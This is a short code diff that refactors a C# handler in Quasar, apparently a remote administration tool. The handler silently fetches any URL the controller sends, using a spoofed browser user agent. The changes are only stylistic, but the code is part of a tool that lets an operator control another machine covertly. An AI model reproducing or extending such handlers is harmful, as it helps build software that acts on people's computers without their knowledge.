@@ -4,7 +4,7 @@ using System;
 using System.Diagnostics;
 using System.Net;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     public class WebsiteVisitorHandler : IMessageProcessor
     {
@@ -24,7 +24,7 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoVisitWebsite message)
         {
-            string url = message.Url;
+            var url = message.Url;
 
             if (!url.StartsWith("http"))
                 url = "http://" + url;
@@ -37,14 +37,14 @@ namespace Quasar.Client.Messages
                 {
                     try
                     {
-                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
+                        var request = (HttpWebRequest)WebRequest.Create(url);
                         request.UserAgent =
                             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                         request.AllowAutoRedirect = true;
                         request.Timeout = 10000;
                         request.Method = "GET";
 
-                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+                        using (var response = (HttpWebResponse)request.GetResponse())
                         {
                         }
                     }
